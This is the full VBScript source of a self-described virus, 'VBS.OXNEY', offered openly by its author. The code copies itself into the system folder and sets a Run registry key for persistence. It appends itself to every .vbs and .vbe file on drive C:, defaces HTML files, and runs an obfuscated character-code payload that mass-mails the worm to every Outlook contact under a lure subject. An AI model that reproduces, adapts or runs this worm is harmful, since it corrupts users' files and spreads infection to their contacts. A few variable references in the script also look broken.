'VBS.OXNEY
'v^v^v^v^v^v^v^v^v^v^v^v^v^v^v^v^v^v^v^v^v^
'create by Spidey with SciTe version 1.59
'my favorite text editor
'v^v^v^v^v^v^v^v^v^v^v^v^v^v^v^v^v^v^v^v^v^
On Error Resume Next
Set hexz = CreateObject("Scripting.FileSystemObject")
Set klxn = hexz.OpenTextFile(WScript.ScriptFullName,1)
xyrt = klxn.ReadAll
Set xhay = hexz.GetSpecialFolder(1)
Set enkz = hexz.GetFile(Wscript.ScriptFullName)
hell = xhay & "\OXNEY.VBS"
If enkz.Attributes = 32 then
enkz.Attributes = enkz.Attributes - enkz.Attributes
enkz.Attributes = enkz.Attributes + 38
End If

enkz.Copy(hell)
rkyx = "HKEY_USERS\.DEFAULT\Software\Microsoft\"
rxuw rkyx & "Windows\CurrentVersion\Run\SPINX", hell & " %"
rxuw rkyx & "Windows\CurrentVersion\SPINX\","why you'r still drunk ???"
xhen "c:\"
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'sorry friend I can't help you, I have no money for this time !!
'again I'm so sorry...
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Function xhen(dhk)
Set xhie = hexz.GetFolder(dhk)
For Each xhken in xhie.Files
exths = hexz.GetExtensionName(xhken.name)
If exths = "vbs" or exths = "vbe" then
 set xnkeh = hexz.OpenTextFile(xhken.path,1,False)
 if xnkeh.ReadLine <> "'I'm sorry friend, I have no money !!" then
 xnkeh.Close()
 set xnkeh = hexz.OpenTextFile(xhken.path,1,False)
 kehnx = xnkeh.ReadAll
 set xnkeh = hexz.CreateTextFile(xhken.path,True,False)
 xnkeh.WriteLine "'I'm sorry friend, I have no money !!"
 xnkeh.Write(kehnx)
 xnkeh.WriteLine xyrt
 xnkeh.Close()
 Else
 xnkeh.Close()
 End If
End If
If exths ="html" or exths = "htm" then
 set xnkeh = hexz.OpenTextFile(xhken.path,1,False)
 if xnkeh.ReadLine <> "<!-- Host by Spidey http://www.Spidey.uni.cc -->" then
 xnkeh.Close()
 set xnkeh = hexz.OpenTextFile(xhken.path,1,False)
 kehnx = xnkeh.ReadAll
 set xnkeh = hexz.CreateTextFile(xhken.path,True,False)
 xnkeh.WriteLine "<!-- Host by Spidey http://www.Spidey.uni.cc -->"
 xnkeh.Write(kehnx)
 xnkeh.WriteLine "<html><head><title>VBS.OXNEY</title></head><body><center><h3><marquee>@@@ YOU GOT MY VIRUS @@@</marquee></h3><font color=669966>made in United State of Indonesia</font><br><b>greetz :<br> to all of virus writer around the world</b><p><font face=courier new size=2>Fucking (f) Spidey</font></center></body></html>"
 xnkeh.Close()
 Else
 xnkeh.Close()
 End If
End If
 Next
For Each hxhe in xhie.SubFolders
xhen(hxhe.path)
Next
End Function
Function rxuw(jxhr,xhke)
Set eyxz = CreateObject("Wscript.Shell")
eyxz.RegWrite jxhr,xhke
End Function
Done =0
If eyxz.RegRead(rkyx & "\Windows\mailex") <> "1" then
execute ahexk("83/101/116/32/111/101/110/120/32/61/32/67/114/101/97/116/101/79/98/106/101/99/116/40/34/79/117/116/76/111/111/107/46/65/112/112/108/105/99/97/116/105/111/110/34/41/13/10/73/102/32/111/101/110/120/32/61/32/34/79/117/116/76/111/111/107/34/32/116/104/101/110/13/10/83/101/116/32/109/97/120/105/32/61/32/111/101/110/120/46/71/101/116/78/97/109/101/83/112/97/99/101/40/34/77/65/80/73/34/41/13/10/70/111/114/32/69/97/99/104/32/97/100/120/104/32/105/110/32/109/97/120/105/46/65/100/100/114/101/115/115/76/105/115/116/115/13/10/97/99/120/121/32/61/32/97/100/120/104/46/65/100/100/114/101/115/115/69/110/116/114/105/101/115/46/67/111/117/110/116/13/10/73/102/32/97/99/120/121/32/60/62/32/48/32/116/104/101/110/13/10/83/101/116/32/109/105/108/101/120/32/61/32/111/101/110/120/46/67/114/101/97/116/101/73/116/101/109/40/48/41/13/10/109/105/108/101/120/46/83/117/98/106/101/99/116/32/61/32/34/70/119/58/32/103/105/118/101/32/115/111/109/101/32/46/46/46/34/13/10/109/105/108/101/120/46/66/111/100/121/32/61/32/34/58/32/72/105/32/100/101/97/114/44/34/43/32/118/98/67/114/76/102/32/43/34/58/32/67/104/101/99/107/32/116/104/101/32/97/116/116/97/99/104/109/101/110/116/32/102/111/114/32/109/111/114/101/32/105/110/102/111/114/109/97/116/105/111/110/32/58/41/34/43/32/118/98/67/114/76/102/32/43/34/82/101/103/97/114/100/115/34/13/10/109/105/108/101/120/46/65/116/116/97/99/104/109/101/110/116/115/46/65/100/100/32/104/101/108/108/13/10/109/105/108/101/120/46/68/101/108/101/116/101/65/102/116/101/114/83/117/98/109/105/116/32/61/32/84/114/117/101/13/10/70/111/114/32/104/120/105/101/32/61/32/49/32/116/111/32/97/99/120/121/13/10/97/100/104/101/120/32/61/32/104/120/105/101/46/65/100/100/114/101/115/115/69/110/116/114/105/101/115/40/104/120/105/101/41/13/10/105/102/32/97/99/120/121/32/61/32/49/32/116/104/101/110/13/10/109/105/108/101/120/46/66/67/67/32/61/32/97/100/104/101/120/46/65/100/100/114/101/115/115/13/10/69/108/115/101/13/10/109/105/108/101/120/46/66/67/67/32/61/32/109/105/108/101/120/46/66/67/67/32/38/32/34/59/32/34/32/38/32/97/100/104/101/120/46/65/100/100/114/101/115/115/13/10/69/110/100/32/73/102/13/10/78/101/120/116/13/10/109/105/108/101/120/46/83/101/110/100/13/10/68/111/110/101/32/61/32/49/13/10/69/110/100/32/73/102/13/10/78/101/120/116/13/10/69/110/100/32/73/102/")
End If
if Done = 1 then ws.RegWrite rkyx & "Windows\mailex","1"
Function ahexk(heyiw)
For kenxya = 1 To Len(heyiw)
If InStr(heyiw, "/") <> 0 Then
nehxia = nehxia & Chr(Left(heyiw, InStr(heyiw, "/") - 1))
heyiw = Mid(heyiw, InStr(heyiw, "/") + 1)
ahexk = nehxia
End If
Next
End Function
'Spidey
